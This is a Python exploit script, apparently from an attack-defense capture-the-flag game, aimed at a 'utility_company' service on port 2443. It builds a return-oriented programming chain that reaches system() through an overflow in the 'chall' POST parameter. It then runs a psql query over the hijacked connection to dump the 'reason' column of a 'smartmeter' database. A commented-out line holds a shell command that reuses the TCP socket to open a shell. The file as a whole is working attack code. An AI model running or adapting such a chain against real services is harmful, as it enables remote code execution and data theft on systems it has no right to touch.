import sys, requests, struct, socket, ssl, time, os
from urllib.parse import urlencode
from binascii import hexlify

ip = '10.60.30.100'
if len(sys.argv) > 1:
    ip = sys.argv[-1]

gadget = 0x431f7c # pop rdi ; add rsp, 0x20 ; pop rbx ; pop rsi ; jmp rsi
addr_system = 0x40cf40
system = struct.pack("<Q", addr_system)
read = struct.pack("<Q", 0x40d8d0)
read_buf = struct.pack("<Q", 0x645000) # .data

#shell_cmd = br"""eval exec\<\>\&`lsof -p$$ -a -d^5|grep TCP|cut -c21-25`""" + b"\0"
shell_cmd = br"""sleep 4 ; echo hi > /dev/tty""" + b"\0"

payload = shell_cmd + (b"a" * (0x38 - len(shell_cmd))) # padding

mov_rax_rdi_pop3 = struct.pack("<Q", 0x4338f6) # : mov rax, rdi ; pop rbx ; pop rbp ; pop rsi ; jmp rsi
pop_rdi = struct.pack("<Q", 0x435cc3) # : pop rdi ; ret

pop_rdx = struct.pack("<Q", 0x40fc9b)# : pop rdx ; add rsp, 0x18 ; pop rbx ; pop rbp ; pop rsi ; jmp rsi

mov_rbp_rsp_call_rax = struct.pack("<Q", 0x40ea8b)# : mov rbp, rsp ; call rax
mov_rdi_rbp_jmp_rax = struct.pack("<Q", 0x413326)# : mov rdi, rbp ; pop rbx ; pop rbp ; push rax ; ret
mov_rax_rbp = struct.pack("<Q", 0x420fbf)#: mov rax, rbp ; pop rbx ; pop rbp ; pop rsi ; jmp rsi
sub_rax_rdx = struct.pack("<Q", 0x4336ab)# : sub rax, rdx ; add rsp, 8 ; pop rsi ; jmp rsi
mov_rbx_rax = struct.pack("<Q", 0x41f012)# : push rax ; pop rbx ; pop rsi ; jmp rsi
mov_rdi_rbx_call_rax = struct.pack("<Q", 0x41f145)# : mov rdi, rbx ; call rax
pop_r12 = struct.pack("<Q", 0x40e7b9)# : pop r12 ; pop rsi ; jmp rsi
mov_rax_r12_pop3 = struct.pack("<Q", 0x419274)# : mov rax, r12 ; pop rbp ; pop r12 ; pop r13 ; pop rsi ; jmp rsi

stack_offset = struct.pack("<Q", 0xa0)

# set rdx to future rax value
payload += pop_rdx + mov_rdi_rbp_jmp_rax + (b"z" * 5 * 8)

payload += pop_rdi + pop_rdi # rax value=call target
payload += mov_rax_rdi_pop3 + b"rbx pad " + b"rbp pad "
payload += mov_rbp_rsp_call_rax
# now rbp has a stack pointer
payload += mov_rax_rbp + b"pop rbx pop rbp "
payload += pop_rdx + stack_offset + (b"z" * 5 * 8)
payload += sub_rax_rdx + b"padding "
# now rax has pointer to shell command
payload += pop_r12 + system
payload += mov_rbx_rax
# now rbx has pointer to shell command, rdx has pointer to mov_rdi_rbx_call_rax
payload += mov_rax_r12_pop3 + (b"X" * 3 * 8)
payload += mov_rdi_rbx_call_rax
# now rdi has pointer to shell command



sig = "a" * 100



context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE
sock = socket.create_connection((ip, 2443))
tls = context.wrap_socket(sock, server_side=False)
tls.do_handshake()


params = {
    "sig": "a" * 100,
    "chall": hexlify(payload).decode(),
}

body = urlencode(params).encode()

request = b""
request += b"POST /utility_company/get_data HTTP/1.1\r\n"
request += "Host: {}:2443\r\n".format(ip).encode()
request += b"User-Agent: curl/7.51.0\r\n"
request += b"Accept: */*\r\n"
request += "Content-Length: {}\r\n".format(len(body)).encode()
request += b"Content-Type: application/x-www-form-urlencoded\r\n"
request += b"\r\n"
request += body
while request:
    written = tls.write(request)
    request = request[written:]

time.sleep(.5)
os.write(tls.fileno(), br"""psql -c 'select reason from owners;' smartmeter""")
print(os.read(tls.fileno(), 4096))
